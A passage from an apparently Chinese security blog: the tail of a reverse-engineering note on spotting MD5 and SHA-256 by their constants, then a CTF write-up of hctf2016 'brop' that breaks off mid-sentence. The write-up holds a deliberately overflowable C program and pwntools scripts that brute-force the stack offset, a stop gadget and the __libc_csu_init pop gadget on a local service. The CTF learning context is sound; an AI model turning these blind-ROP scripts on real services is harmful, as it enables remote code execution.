class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">size_t</span> filledLen;</span><br><span class="line"><span class="keyword">char</span> *filledData; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> A,B,C,D;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> *M = (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)<span class="built_in">malloc</span>(GROUP_SIZE);</span><br><span class="line"></span><br><span class="line">filledLen = md5_update(&amp;filledData,input,inLen);  </span><br><span class="line">   </span><br><span class="line">   md5_init(&amp;A,&amp;B,&amp;C,&amp;D);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; filledLen / GROUP_SIZE;i++)&#123;</span><br><span class="line">md5_transform(M, filledData + i * <span class="number">64</span>);  <span class="comment">//char to int </span></span><br><span class="line">data_round(&amp;A,&amp;B,&amp;C,&amp;D,M);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(out,<span class="string">&quot;%08x%08x%08x%08x&quot;</span>,shift(A),shift(B),shift(C),shift(D));</span><br><span class="line"></span><br><span class="line">   <span class="built_in">free</span>(M);</span><br><span class="line">M = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(filledData);</span><br><span class="line">filledData = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><ul><li>第一步，补位（filledLen），<ul><li>使得输入的长度位<strong>512*n+448（单位为bit）</strong>；补位通过形如10000000….的比特位进行。</li><li>然后再补64位，用于记录<strong>原始信息</strong>长度。</li><li>补位结束后，信息长度为512*n bit；</li></ul></li><li>第二步，初始化（md5_init）：<ul><li>定义四个<strong>四字节</strong>标准幻数，总大小十六字节，作为循环运算的<strong>初始值</strong>；（固定的，后文会写）；</li><li>四个标准幻数应以小端字节序存储；</li></ul></li><li>第三步，混淆（64位一组）：<ul><li>使用FF、GG、HH、II四个函数，参与混淆过程；</li><li>最终输出结果位四个标准幻数混淆后的值。</li></ul></li></ul><h4 id="3、特征"><a href="#3、特征" class="headerlink" title="3、特征"></a>3、特征</h4><p>​    我们并不关系混淆的逻辑，只关心算法的特征。</p><p><strong>补位操作：</strong></p><p>​    补位操作中一般都可能会按照字节进行操作，那么我们就可以看到类似<strong>64和56</strong>（448/4）的常量，且补位时需要先补充一个1，因此如果按照字节补充，就会出现<strong>0x80</strong>；</p><p><strong>初始化：</strong></p><p>​    初始化操作不在循环中进行，同时，初始化的四个幻数是固定的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> A=<span class="number">0x67452301</span></span><br><span class="line"><span class="keyword">int</span> B=<span class="number">0xEFCDAB89</span></span><br><span class="line"><span class="keyword">int</span> C=<span class="number">0x98BADCFE</span></span><br><span class="line"><span class="keyword">int</span> D=<span class="number">0x10325476</span></span><br></pre></td></tr></table></figure><p>​    就是<strong>1到E再从E到1</strong>，只不过是<strong>小端存储</strong>。</p><p>​    因此，有时候也会以数组的形式<strong>顺序</strong>定义，然后通过<strong>memcpy</strong>等函数进行进一步的小端存储。</p><p><strong>混淆：</strong></p><p>​    混淆肯定是循环，循环轮数是<strong>补位后的长度除以64</strong>，且其使用的函数FF、GG、HH、II逻辑非常有识别度。</p><p>​    其函数中会存在大量的调用如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220625153028084.png" alt="image-20220625153028084"></p><p>​    每个函数调用<strong>16次</strong>，且传参为<strong>七个</strong>。</p><p>​    进一步进入，FF、GG、HH、II的逻辑都是简单的<strong>位运算</strong>，不具有分支循环逻辑。</p><h2 id="0x07-sha256"><a href="#0x07-sha256" class="headerlink" title="0x07 sha256"></a>0x07 sha256</h2><h3 id="一、解密脚本-6"><a href="#一、解密脚本-6" class="headerlink" title="一、解密脚本"></a>一、解密脚本</h3><p>​    sha256脚本与md5通用，在上文中修改函数名即可，不多赘述。</p><h3 id="二、程序情况-6"><a href="#二、程序情况-6" class="headerlink" title="二、程序情况"></a>二、程序情况</h3><p>​    sha256是sha2下的分支哈希函数。</p><h4 id="1、输入输出"><a href="#1、输入输出" class="headerlink" title="1、输入输出"></a>1、输入输出</h4><p>​    对于任意长度的消息，SHA256 都会产生一个 <strong>256bit 长</strong>的哈希值，相当于是个长度为 32 个字节的数组，通常用一个<strong>长度为 64 的十六进制字符串</strong>来表示。</p><h4 id="2、主要函数和加密思路：-1"><a href="#2、主要函数和加密思路：-1" class="headerlink" title="2、主要函数和加密思路："></a>2、主要函数和加密思路：</h4><p>主函数思路如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sha_init(&amp;A,&amp;B,&amp;C,&amp;D,&amp;E,&amp;F,&amp;G,&amp;H);</span><br><span class="line"></span><br><span class="line">filledLen = sha_update(&amp;filledData,input,inLen);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; filledLen / GROUP_SIZE;i++)&#123;</span><br><span class="line">sha_transform(M, filledData + i * <span class="number">64</span>);  <span class="comment">//char to int </span></span><br><span class="line">data_round(&amp;A,&amp;B,&amp;C,&amp;D,&amp;E,&amp;F,&amp;G,&amp;H,M);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sprintf</span>(out,<span class="string">&quot;%08x%08x%08x%08X%08x%08x%08x%08x&quot;</span>,A,B,C,D,E,F,G,H);</span><br></pre></td></tr></table></figure><ul><li><p>第一步，初始化sha_init：</p><ul><li>和md5相似，sha256也需要初始化一个标准幻数，对其进行处理最后达成输出；</li><li>他们也是以小端进行存储，一共8个，每个<strong>四字节</strong>，是通过质数平方根的小数求得，但是不重要，因为是固定的（见下文）；</li></ul></li><li><p>第二步，修正输入sha_update：</p><ul><li>和md5相同，sha修正的思路完全一致；</li><li>使得输入的长度位<strong>512*n+448（单位为bit）</strong>；补位通过形如10000000….的比特位进行。</li><li>然后再补64位，用于记录<strong>原始信息</strong>长度。补位结束后，信息长度为512*n bit；</li></ul></li><li><p>第三步，轮加密：</p><ul><li>先使用sha_transform进行初步对于数据的类型转化处理；</li><li>轮加密的整体思路就是分块进行，先把输入分成定长大小的块，然后再把每个块在分块进行逻辑加密；</li></ul></li></ul><h4 id="3、特征-1"><a href="#3、特征-1" class="headerlink" title="3、特征"></a>3、特征</h4><p><strong>初始化：</strong></p><p>​    标准幻数是最容易识别的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">0x67</span>, <span class="number">0xE6</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>,</span><br><span class="line">b=<span class="number">0x85</span>, <span class="number">0xAE</span>, <span class="number">0x67</span>, <span class="number">0xBB</span>,</span><br><span class="line">c=<span class="number">0x72</span>, <span class="number">0xF3</span>, <span class="number">0x6E</span>, <span class="number">0x3C</span>,</span><br><span class="line">d=<span class="number">0x3A</span>, <span class="number">0xF5</span>, <span class="number">0x4F</span>, <span class="number">0xA5</span>,</span><br><span class="line">e=<span class="number">0x7F</span>, <span class="number">0x52</span>, <span class="number">0x0E</span>, <span class="number">0x51</span>,</span><br><span class="line">f=<span class="number">0x8C</span>, <span class="number">0x68</span>, <span class="number">0x05</span>, <span class="number">0x9B</span>,</span><br><span class="line">g=<span class="number">0xAB</span>, <span class="number">0xD9</span>, <span class="number">0x83</span>, <span class="number">0x1F</span>,</span><br><span class="line">h=<span class="number">0x19</span>, <span class="number">0xCD</span>, <span class="number">0xE0</span>, <span class="number">0x5B</span></span><br></pre></td></tr></table></figure><p>​    注意，实际顺序是小端，即上面的倒序；</p><p><strong>轮加密：</strong></p><p>​    轮加密中，我们会用到一个重要的巨大常量，即K表，由上代码中data_round调用：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220625180922642.png" alt="image-20220625180922642"></p><p>看到这样的常量标志，就非常具有意义了，其值如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="keyword">const</span> K[<span class="number">64</span>] =&#123;</span><br><span class="line">        <span class="number">0x428a2f98</span>, <span class="number">0x71374491</span>, <span class="number">0xb5c0fbcf</span>, <span class="number">0xe9b5dba5</span>, <span class="number">0x3956c25b</span>, <span class="number">0x59f111f1</span>, <span class="number">0x923f82a4</span>, <span class="number">0xab1c5ed5</span>,  </span><br><span class="line">        <span class="number">0xd807aa98</span>, <span class="number">0x12835b01</span>, <span class="number">0x243185be</span>, <span class="number">0x550c7dc3</span>, <span class="number">0x72be5d74</span>, <span class="number">0x80deb1fe</span>, <span class="number">0x9bdc06a7</span>, <span class="number">0xc19bf174</span>,  </span><br><span class="line">        <span class="number">0xe49b69c1</span>, <span class="number">0xefbe4786</span>, <span class="number">0x0fc19dc6</span>, <span class="number">0x240ca1cc</span>, <span class="number">0x2de92c6f</span>, <span class="number">0x4a7484aa</span>, <span class="number">0x5cb0a9dc</span>, <span class="number">0x76f988da</span>,  </span><br><span class="line">        <span class="number">0x983e5152</span>, <span class="number">0xa831c66d</span>, <span class="number">0xb00327c8</span>, <span class="number">0xbf597fc7</span>, <span class="number">0xc6e00bf3</span>, <span class="number">0xd5a79147</span>, <span class="number">0x06ca6351</span>, <span class="number">0x14292967</span>,  </span><br><span class="line">        <span class="number">0x27b70a85</span>, <span class="number">0x2e1b2138</span>, <span class="number">0x4d2c6dfc</span>, <span class="number">0x53380d13</span>, <span class="number">0x650a7354</span>, <span class="number">0x766a0abb</span>, <span class="number">0x81c2c92e</span>, <span class="number">0x92722c85</span>,  </span><br><span class="line">        <span class="number">0xa2bfe8a1</span>, <span class="number">0xa81a664b</span>, <span class="number">0xc24b8b70</span>, <span class="number">0xc76c51a3</span>, <span class="number">0xd192e819</span>, <span class="number">0xd6990624</span>, <span class="number">0xf40e3585</span>, <span class="number">0x106aa070</span>,  </span><br><span class="line">        <span class="number">0x19a4c116</span>, <span class="number">0x1e376c08</span>, <span class="number">0x2748774c</span>, <span class="number">0x34b0bcb5</span>, <span class="number">0x391c0cb3</span>, <span class="number">0x4ed8aa4a</span>, <span class="number">0x5b9cca4f</span>, <span class="number">0x682e6ff3</span>,  </span><br><span class="line">        <span class="number">0x748f82ee</span>, <span class="number">0x78a5636f</span>, <span class="number">0x84c87814</span>, <span class="number">0x8cc70208</span>, <span class="number">0x90befffa</span>, <span class="number">0xa4506ceb</span>, <span class="number">0xbef9a3f7</span>, <span class="number">0xc67178f2</span>  </span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure><p>此外：</p><p>​    处理函数sha_transform应由嵌套循环组成，具体取决于书写者使用的数据结构。</p><p>​    轮函数data_round应该由循环次数为<strong>16 、64 、64</strong>的三个循环的主体构成。</p>]]></content>
      
      
      <categories>
          
          <category> re-Note </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn_hctf2016-brop_writeup</title>
      <link href="/2022/05/17/pwn_hctf2016-brop_writeup/"/>
      <url>/2022/05/17/pwn_hctf2016-brop_writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-hctf2016-brop-writeup"><a href="#pwn-hctf2016-brop-writeup" class="headerlink" title="pwn_hctf2016-brop_writeup"></a>pwn_hctf2016-brop_writeup</h1><p>​    真能想啊，这rop玩的真是花。</p><h2 id="0x01-从源码出发："><a href="#0x01-从源码出发：" class="headerlink" title="0x01 从源码出发："></a>0x01 从源码出发：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//清空标准输入、标准输出、标准错误的缓存内容</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!check())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Do not dump my memory&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No password, no game&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">1024</span>);<span class="comment">//溢出无极限</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(buf,<span class="string">&quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    源码可以说非常简单了，问题是这个题不提供二进制文件，也就是<strong>Blind_ROP</strong>，我们学习这种rop，就从这题出发：</p><h2 id="0x02-确定返回地址"><a href="#0x02-确定返回地址" class="headerlink" title="0x02 确定返回地址"></a>0x02 确定返回地址</h2><p>​    首先要确定返回地址与溢出串的距离，通过枚举填充的方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getsize</span>():</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">            p.send(i*<span class="string">&#x27;a&#x27;</span>)<span class="comment"># 控制发包的长度，枚举尝试</span></span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">&#x27;No password&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">            <span class="comment">#如果出错了，或者不返回No password了，说明check函数返回地址被覆盖了</span></span><br><span class="line">            <span class="comment">#此时的长度超过了偏移一位，减一就是偏移</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">size = getsize()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;size is [%s]&quot;</span>%size</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220517135802137.png" alt="image-20220517135802137"></p><h2 id="0x03-信息泄露"><a href="#0x03-信息泄露" class="headerlink" title="0x03 信息泄露"></a>0x03 信息泄露</h2><h3 id="一、寻找stop-gadget"><a href="#一、寻找stop-gadget" class="headerlink" title="一、寻找stop_gadget"></a>一、寻找stop_gadget</h3><p>​    理解这一步，我们不需要理解为什么要找stop_gadget，我们只需要理解什么是stop_gadget，怎么找就可以，等我们找到了，下一步自然就会告诉我们为啥需要这个。</p><p>​    那么首先，<strong>什么是stop_gadget</strong>。</p><p>​    所谓<code>stop gadget</code>一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态（也就是程序不崩溃，跳转过来就不动了）。说白了，我认为这个<strong>stop_gadget就是找到一个跳转过去不会崩溃的程序片段</strong>。</p><p>​    然后，我们<strong>如何找到</strong>一段如上文描述的gadget呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">length = <span class="number">72</span><span class="comment">#上一步计算出距离返回地址的偏移</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getStopGadgets</span>(<span class="params">length</span>):</span></span><br><span class="line">addr = <span class="number">0x400000</span> <span class="comment">#从头开始遍历</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*length +p64(addr)<span class="comment">#程序执行完check，就会返回到addr</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;know password?\n&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">output = sh.recvuntil(<span class="string">&quot;password?\n&quot;</span>)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one success addr 0x%x:&quot;</span> % (addr))</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#这里是重点，这里接的是什么，是main函数的输出，</span></span><br><span class="line">            <span class="comment">#也就是这里所谓的找stop_gadget就是找main函数的起始地址</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">&#x27;WelCome&#x27;</span>):</span><br><span class="line">sh.close()</span><br><span class="line">addr+=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">addr+=<span class="number">1</span></span><br><span class="line">sh.close()</span><br><span class="line">stop_gadgets = getStopGadgets(length)</span><br><span class="line"><span class="built_in">print</span> stop_gadgets</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220517135913197.png" alt="image-20220517135913197">    </p><p>也就是说，这里的poc实际是在找main函数的起始地址，我们运行一下，就可以找到main函数的开始地址。</p><p>​    但是main函数的开始地址又有什么用呢</p><h3 id="二、stop-gadgets利用的思路"><a href="#二、stop-gadgets利用的思路" class="headerlink" title="二、stop_gadgets利用的思路"></a>二、stop_gadgets利用的思路</h3><p>​    首先，我们下一步要做什么，因为什么地址都看不到，我们肯定是要找一些比较通用的函数进行信息泄露，同时我们调用函数也需要使用x64下的寄存器传参，很自然的就想到了**__libc_csu_init**，这个函数真的太重要了。有了他，我们才能泄露寄存器，才能进行的下去，而且他还有一个重要的特征：6个连续的pop。</p><p>​    要找到这个函数（实际我们找的就是最后的六个pop），我们肯定也是进行爆破，但是存在的问题是，我们如何爆破：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220516221532627.png" alt="image-20220516221532627"></p><p>​    如上图，下面一串是我们的输入，假设我们从头开始遍历（遍历的方式就是根据刚刚得到的偏移量覆盖返回地址），遍历到了gadget，其内容是：<code>pop %rdi;  ret;</code></p><p>​    把这句话的地址覆盖了返回地址，然会执行了，执行完了pop之后执行ret（等于pop %rsi），直接就跳到了箭头所指的那个无效地址0xdead，程序崩溃了，没有任何回显，我们压根就不知道刚刚发生了啥。</p><p>​    于是天才的大哥想到了一个方法，如果我们能够知道程序中的一个gadget，这个gadget的代码的效果就是让这个程序停住，不继续执行，也不崩溃，就可以达成图二的效果（注意，图二中原图是不正确的，我个人认为应该把另外两个位置改为0xdead才可以，见红色字）：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220516221519176.png" alt="image-20220516221519176"></p><p>​    依然是同一个内容是：<code>pop %rdi;  ret;</code>的片段，我们把返回地址改为这个片段的地址，然后pop弹了一个，之后ret了，正好到了这个停止位，程序停住了，没有崩溃，这就说明曾经执行了<code>pop %rdi;  ret;</code>的片段，虽然不能确定一定是<code>pop %rdi;</code>，有可能是pop其他寄存器，比如<code>pop %rax;  ret;</code>也能让程序停下来。或者还有可能不只是一句pop，有可能还有其他代码的存在，只是对结果没有影响，但是我们大概能做一个类似的判断，也就是这段代码里可能类似<code>pop %rdi;  ret;</code>。</p><p>​    这时候，你会说，这有啥用，这一句代码是<code>pop %rdi;  ret;</code>的概率很低，很有是有其他代码干扰的内容。你说的对，但我们要找的不是<code>pop %rdi;  ret;</code>。我们要找的是**__libc_csu_init<strong>函数中的六连pop片段！如果说，一个pop的gadget很容易有代码类似，那如果上图中间的dead变成了</strong>六个0xdead**，必须精准的pop六次，才能达到正确的stop地址，就不那么容易相似了。</p><p>​    也就是说我们通过这种设置stop_gadget的方法，可以遍历（猜测）出**__libc_csu_init**函数中六连pop片段的位置！</p><h3 id="三、寻找-libc-csu-init片段"><a href="#三、寻找-libc-csu-init片段" class="headerlink" title="三、寻找__libc_csu_init片段"></a>三、寻找__libc_csu_init片段</h3><p>​    我们明白了上面的原理，手中还有main的起始地址作为我们的<strong>gadget</strong>，直接就可以开始爆破__libc_csu_init的6pop片段。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于按照上面的逻辑找6个pop</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span>(<span class="params">length, stop_gadget, addr</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">        <span class="comment">#依然是遍历返回地址，如果有六个pop，就会顺利执行到stop_gadget，也就是main</span></span><br><span class="line">        <span class="comment">#如果有少于或者多于六个pop，都不行，直接就崩溃</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="built_in">print</span> content</span><br><span class="line">        <span class="comment"># stop gadget returns memory</span></span><br><span class="line">        <span class="comment">#if not content.startswith(&#x27;WelCome&#x27;):</span></span><br><span class="line">        <span class="comment">#    return False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#上面是正向找了一下，找到一个不会崩溃的地址，但是我们为了保险，还要反向检测一下</span></span><br><span class="line"><span class="comment">#因为这个片段有可能找到了一个返回main的地址，或者就是一个main地址</span></span><br><span class="line"><span class="comment">#所以反向检测一下这个地址，输入错误的payload会不会崩溃，崩溃了说明找对了</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span>(<span class="params">length, addr</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005c0</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#######get_brop_gadgets_addr#######</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>​    <img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220517140003803.png" alt="image-20220517140003803"></p><p>​    这里的脚本顺利执行后，我们就有了比较关键的<strong>6pop_gadget</strong>，我们能拿他干什么呢，首先肯定是我们可以控制本身的六个寄存器，<strong>rbx,rbp,r12,r13,r14,r15</strong> 。在学习csu_rop的时候，我们知道如果手动修改偏移来裁剪汇编代码，我们还可以达成：</p><p><code>pop rsi; pop r15;ret;</code>和<code>pop rdi; 